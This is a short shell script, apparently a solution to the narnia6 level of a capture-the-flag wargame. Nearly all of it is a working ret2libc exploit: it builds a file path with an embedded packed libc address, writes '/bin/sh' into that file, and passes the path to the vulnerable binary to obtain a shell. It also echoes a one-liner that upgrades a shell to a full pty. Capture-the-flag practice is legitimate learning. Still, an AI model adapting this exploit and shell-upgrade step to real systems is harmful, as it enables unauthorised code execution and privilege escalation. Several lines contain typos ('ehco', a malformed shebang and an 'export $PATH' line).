#/bin/mkdir /tmp/nr7
#export $PATH=/tmp/nr7
ehco "Very simple re2libc"
echo "Run this after gaining shell:"
echo "python -c 'import pty; pty.spawn("/bin/bash")'"
/usr/bin/printf "/bin/sh" > `/usr/bin/python -c 'from pwn import *; print("/tmp/nr7"+p32(0xf7e4c850))'`
/bin/chmod +x  `/usr/bin/python -c 'from pwn import *; print("/tmp/nr7"+p32(0xf7e4c850))'`
/narnia/narnia6 `/usr/bin/python -c 'from pwn import *; print("/tmp/nr7"+p32(0xf7e4c850))'` a
